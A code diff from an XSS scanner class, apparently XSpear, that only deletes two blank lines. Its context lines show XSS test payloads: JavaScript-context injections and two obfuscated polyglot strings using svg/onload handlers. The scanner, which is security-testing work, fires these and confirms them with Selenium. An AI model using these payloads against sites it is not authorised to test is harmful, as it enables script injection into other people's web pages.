@@ -558,7 +558,6 @@ class XspearScan
     r.push makeQueryPattern('x', '\'%2Balert(45)%2B\'', 'alert(45)', 'h', "triggered ".yellow+"in JS".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', '"%2Balert(45)%2B"', 'alert(45)', 'h', "triggered ".yellow+"in JS".red, CallbackXSSSelenium)
 
-
     # Check Selenium XSS Polyglot
     r.push makeQueryPattern('x', 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', 'javascript:"/*`/*\"/*\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)
@@ -578,7 +577,6 @@ class XspearScan
     r = r.flatten
     log('s', "test query generation is complete. [#{r.length} query]")
     log('s', "starting XSS Scanning. [#{@thread} threads]")
-
 
     threads = []
     r.each_slice(@thread) do |jobs|
